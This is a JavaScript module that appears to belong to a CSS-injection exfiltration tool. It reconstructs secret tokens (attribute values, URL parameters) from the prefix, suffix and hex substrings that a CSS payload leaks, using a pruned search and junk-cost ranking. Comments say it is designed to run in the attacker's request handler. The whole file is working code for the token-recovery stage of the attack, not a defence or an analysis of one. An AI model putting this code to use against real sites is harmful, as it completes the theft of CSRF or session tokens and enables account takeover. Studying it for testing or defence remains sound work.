'use strict';

// Token reconstruction from leaked substrings.
//
// The CSS payload leaks:
//   - start:  the first few chars of the token
//   - end:    the last few chars of the token
//   - chunks: the *set* of every hex `windowSize`-char substring present
//             anywhere in the attribute value: the token's own windows plus
//             any hex noise from the rest of the value (e.g. "bac" from
//             "callback", or junk query parameters).
//
// Positions and repeat counts are not leaked, so we search for every token of
// the configured length that matches the start and end and only contains
// leaked windows, building it one char at a time. Candidates are ranked by how
// cheaply the leaked windows they *don't* use can be explained as junk: a
// single contiguous run of leftovers is cheap, while a token that skips part
// of the real token to detour through junk leaves extra fragments behind. If
// several tokens remain equally plausible, all of them are returned, because
// the leaked data genuinely can't tell them apart.

const HEX = '0123456789abcdef';

// Walks may cover up to this many fewer windows than the best walk and still
// be ranked: junk can only beat the real token on coverage by using the slack
// from the token's own repeated windows, which is small.
const COVERAGE_MARGIN = 2;
// Search limits. The solver runs inside a request handler, so it must not
// block the server: these keep the worst case (3-char windows, 40 chars, heavy
// junk) to ~0.1s, and measured accuracy at 40 chars is unchanged versus limits
// 10-40x higher.
const DEFAULT_MAX_RANKED = 500;

function tryStitch(data, opts = {}) {
  const {
    windowSize: k = 4,
    tokenLength: length,
    context = new Set(),
    maxCandidates = 64,
    maxSteps = 200_000,
    maxRanked = DEFAULT_MAX_RANKED,
    stats,
    // Blind URL params: the leaked first chars of every hex run that follows
    // an "=" and the last chars of every run that ends the URL or meets "&"
    // or "#". Real junk is whole params, so leftovers that start or end
    // mid-run mean the candidate spliced into junk, and cost extra.
    boundaries,
  } = opts;
  const { start, end } = data || {};
  if (!start || !end || !length || length < Math.max(k, start.length, end.length)) return null;

  const isWindow = new RegExp(`^[${HEX}]{${k}}$`);
  const leaked = new Set((data.chunks || []).filter(c => isWindow.test(c)));
  // Windows from the known text around the token are expected leftovers.
  const weight = w => (context.has(w) ? 0 : 1);

  // --- search ---------------------------------------------------------------

  // Fewest further chars needed from each (k - 1)-char state to finish on the
  // known end, so walks that can no longer get there in time are cut early.
  const node = s => s.slice(-(k - 1));
  const isFinal = n => (end.length >= k - 1 ? n === node(end) : n.endsWith(end));
  const finish = new Map();
  for (const w of leaked) {
    if (isFinal(node(w))) finish.set(node(w), 0);
  }
  const into = new Map();
  for (const w of leaked) {
    const to = node(w);
    if (!into.has(to)) into.set(to, []);
    into.get(to).push(w.slice(0, -1));
  }
  const queue = [...finish.keys()];
  while (queue.length) {
    const to = queue.shift();
    for (const from of into.get(to) || []) {
      if (!finish.has(from)) {
        finish.set(from, finish.get(to) + 1);
        queue.push(from);
      }
    }
  }

  const used = new Map();
  let token = '';
  let score = 0;
  let best = -1;
  let found = [];
  let steps = 0;
  let truncated = false;

  function push(c) {
    const next = token + c;
    if (next.length >= k) {
      const w = next.slice(-k);
      if (!leaked.has(w)) return false;
      const n = used.get(w) || 0;
      used.set(w, n + 1);
      if (n === 0) score += weight(w);
    }
    token = next;
    return true;
  }

  function pop() {
    if (token.length >= k) {
      const w = token.slice(-k);
      const n = used.get(w);
      if (n === 1) { used.delete(w); score -= weight(w); } else used.set(w, n - 1);
    }
    token = token.slice(0, -1);
  }

  // Stop once the step budget is spent or there are already more candidates
  // than can be ranked; this runs inside a request handler, so it must not
  // block the server for long.
  const exhausted = () => {
    if (steps > maxSteps || found.length >= maxRanked) truncated = true;
    return truncated;
  };

  function dfs() {
    steps++;
    if (exhausted()) return;
    const remaining = length - token.length;
    if (remaining === 0) {
      if (score > best) {
        best = score;
        found = found.filter(f => f.score >= best - COVERAGE_MARGIN);
      }
      found.push({ token, score });
      return;
    }
    // Each further char can cover at most one new window.
    if (score + remaining < best - COVERAGE_MARGIN) return;
    if (token.length >= k - 1 && !(finish.get(node(token)) <= remaining)) return;

    const endIndex = token.length - (length - end.length);
    for (const c of endIndex >= 0 ? end[endIndex] : HEX) {
      if (push(c)) { dfs(); pop(); }
      if (exhausted()) return;
    }
  }

  for (const c of start) {
    if (!push(c)) return null;
  }
  dfs();
  if (stats) stats.steps = (stats.steps || 0) + steps;
  if (!found.length) return null;

  // --- ranking --------------------------------------------------------------

  // Approximate junk chars needed to produce the windows a candidate leaves
  // unused: one char per window plus (k - 1) to start each run, where runs =
  // the minimum number of trails covering the leftover windows (per connected
  // component, the larger of 1 and the total out/in surplus).
  const unexplained = [...leaked].filter(w => weight(w) === 1);
  function leftoverCost(candidate) {
    const own = new Set();
    for (let i = 0; i + k <= candidate.length; i++) own.add(candidate.slice(i, i + k));
    const left = unexplained.filter(w => !own.has(w));
    if (!left.length) return 0;

    const parent = new Map();
    const find = x => {
      while (parent.get(x) !== x) x = parent.get(x);
      return x;
    };
    const balance = new Map();
    for (const w of left) {
      const a = w.slice(0, -1);
      const b = w.slice(1);
      if (!parent.has(a)) parent.set(a, a);
      if (!parent.has(b)) parent.set(b, b);
      parent.set(find(a), find(b));
      balance.set(a, (balance.get(a) || 0) + 1);
      balance.set(b, (balance.get(b) || 0) - 1);
    }
    const surplus = new Map();
    for (const [node, bal] of balance) {
      const root = find(node);
      surplus.set(root, (surplus.get(root) || 0) + Math.max(0, bal));
    }
    let runs = 0;
    for (const s of surplus.values()) runs += Math.max(1, s);
    return left.length + runs * (k - 1) + (boundaries ? unanchored(balance, find) * k : 0);
  }

  // Leftover trail ends that can't be the start or end of a param value: each
  // source (more out than in) should begin a run, each sink should end one,
  // and a balanced component needs one of each somewhere.
  function unanchored(balance, find) {
    const { starts, ends } = boundaries;
    const a = [...starts][0]?.length || 2;
    const comps = new Map();
    for (const [node, bal] of balance) {
      const root = find(node);
      if (!comps.has(root)) comps.set(root, []);
      comps.get(root).push([node, bal]);
    }
    let bad = 0;
    for (const nodes of comps.values()) {
      const sources = nodes.filter(([, b]) => b > 0);
      const sinks = nodes.filter(([, b]) => b < 0);
      if (!sources.length) {
        if (!nodes.some(([n]) => starts.has(n.slice(0, a)))) bad++;
        if (!nodes.some(([n]) => ends.has(n.slice(-a)))) bad++;
        continue;
      }
      for (const [n, b] of sources) if (!starts.has(n.slice(0, a))) bad += b;
      for (const [n, b] of sinks) if (!ends.has(n.slice(-a))) bad -= b;
    }
    return bad;
  }

  // The cost is an estimate (real junk can pass through windows the token also
  // uses), so anything within k - 1 of the best is a tie. That's still less
  // than skipping a single real window when there's no junk (1 + (k - 1)), so
  // clean extractions stay unambiguous.
  const ranked = found
    .map(f => ({ token: f.token, cost: leftoverCost(f.token) }))
    .sort((a, b) => a.cost - b.cost || (a.token < b.token ? -1 : 1));
  let kept = ranked.filter(f => f.cost <= ranked[0].cost + (k - 1));
  if (kept.length > maxCandidates) {
    kept = kept.slice(0, maxCandidates);
    truncated = true;
  }
  const tokens = kept.map(f => f.token);

  const result = { token: tokens[0], length };
  if (tokens.length > 1 || truncated) result.candidates = tokens;
  if (truncated) result.truncated = true;
  if (stats) stats.scored = kept;
  return result;
}

// --- unknown length ---------------------------------------------------------
//
// Blind mode doesn't know how long the token is, and URL params also don't
// know which of several leaked ends is the token's, so this tries every
// start/end pair over a range of lengths.
//
//   whole:  the attribute is the token (input value, meta content, data-*), so
//           every leaked window is the token's. It needs at least
//           |windows| + k - 1 chars, plus one per repeated window; every
//           length that uses every window is listed, shortest first.
//   !whole: a URL param, with junk windows from the rest of the URL. Every
//           length up to "uses every window" is tried and ranked by
//           leftover cost like tryStitch; ties across lengths are listed.

// Repeated windows make a token longer than its window count suggests; more
// than this many in one token is vanishingly rare with 3- or 4-char windows.
const REPEAT_SLACK = 6;
const DEFAULT_BUDGET = 600_000;

function stitchUnknownLength(data, opts = {}) {
  const {
    windowSize: k = 4,
    context = new Set(),
    whole = true,
    minLength = 2 * Math.max(1, ...(data.starts || []).map(s => s.length)),
    maxLength = 256,
    budget = DEFAULT_BUDGET,
    maxCandidates = 64,
  } = opts;
  const starts = [...new Set(data.starts || [])];
  const ends = [...new Set(data.ends || [])];
  const isWindow = new RegExp(`^[${HEX}]{${k}}$`);
  const chunks = [...new Set((data.chunks || []).filter(c => isWindow.test(c)))];
  if (!starts.length || !ends.length || !chunks.length) return null;
  const boundaries = !whole && data.runStarts
    ? { starts: new Set([...data.runStarts, ...starts]), ends: new Set(ends) }
    : undefined;

  const covering = chunks.length + k - 1;
  const lo = whole ? covering : Math.max(k, minLength);
  const hi = Math.min(maxLength, covering + REPEAT_SLACK);
  let spent = 0;
  let truncated = false;
  const scored = [];

  for (let length = lo; length <= hi && !truncated; length++) {
    for (const start of starts) {
      for (const end of ends) {
        if (spent >= budget) { truncated = true; break; }
        const stats = {};
        const result = tryStitch({ start, end, chunks }, {
          windowSize: k,
          tokenLength: length,
          context,
          maxSteps: Math.min(200_000, budget - spent),
          stats,
          boundaries,
        });
        spent += stats.steps || 0;
        if (result && result.truncated) truncated = true;
        if (result) for (const f of stats.scored) scored.push({ ...f, length });
      }
      if (truncated) break;
    }
  }
  if (!scored.length) return null;

  let pool;
  if (whole) {
    // Every length that uses every window fits, shortest first. Longer fits
    // only exist when the token repeats a substring (e.g. "fffff" leaks the
    // same windows as "ffff"), and then the count really is unknown.
    pool = scored.filter(f => f.cost === 0);
    if (!pool.length) return null; // not a pure hex value
  } else {
    // Score by total chars explained (token + junk). Leftover cost alone
    // favours longer tokens: when a chance overlap lets the token's tail swap
    // with a junk param's, both splits fit the data equally well, and the
    // longer token would always win.
    for (const f of scored) f.cost += f.length;
    const best = Math.min(...scored.map(f => f.cost));
    pool = scored.filter(f => f.cost <= best + (k - 1));
  }
  pool.sort((a, b) => a.cost - b.cost || a.length - b.length || (a.token < b.token ? -1 : 1));
  let tokens = [...new Set(pool.map(f => f.token))];
  if (tokens.length > maxCandidates) {
    tokens = tokens.slice(0, maxCandidates);
    truncated = true;
  }

  const result = { token: tokens[0], length: tokens[0].length };
  if (tokens.length > 1 || truncated) result.candidates = tokens;
  if (truncated) result.truncated = true;
  return result;
}

module.exports = { tryStitch, stitchUnknownLength };
